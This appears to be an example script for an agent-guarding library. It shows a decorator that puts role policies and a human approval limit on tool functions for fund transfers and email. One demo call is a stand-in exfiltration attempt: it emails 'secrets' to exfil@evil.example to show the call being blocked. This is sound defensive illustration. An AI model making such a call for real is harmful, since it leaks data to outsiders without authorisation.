"""Protect plain Python tool functions with the @shield.protect_tool decorator.

Run: python examples/decorator_usage.py
"""

from __future__ import annotations

from agentshield.hitl import CallbackApprover
from agentshield.models import SessionContext
from agentshield.shield import Shield, ToolBlocked

# A human-in-the-loop that approves transfers only below EUR 500.
approver = CallbackApprover(lambda req: float(req.call.args.get("amount", 1e9)) < 500, name="policy-bot")
shield = Shield.default(approver=approver)
analyst = SessionContext(role="analyst")
support = SessionContext(role="support")


@shield.protect_tool(ctx=lambda: support)
def transfer_funds(amount: float, to_account: str) -> str:
    return f"transferred {amount} to {to_account}"


@shield.protect_tool(ctx=lambda: analyst)
def send_email(to: str, subject: str, body: str) -> str:
    return f"sent to {to}"


def try_call(label: str, fn, **kwargs):
    try:
        print(f"[OK]    {label}: {fn(**kwargs)}")
    except ToolBlocked as exc:
        print(f"[BLOCK] {label}: {exc}")


if __name__ == "__main__":
    # Allowed: support role, amount under the approval limit, valid IBAN.
    try_call("small transfer", transfer_funds, amount=120.0, to_account="DE89370400440532013000")
    # Blocked by HITL: over the approver's EUR 500 limit.
    try_call("large transfer", transfer_funds, amount=5000.0, to_account="DE89370400440532013000")
    # Blocked by policy: analyst may send email, but only to allowlisted domains.
    try_call("internal email", send_email, to="lena@acme-corp.com", subject="hi", body="ping")
    try_call("external email", send_email, to="exfil@evil.example", subject="data", body="secrets")
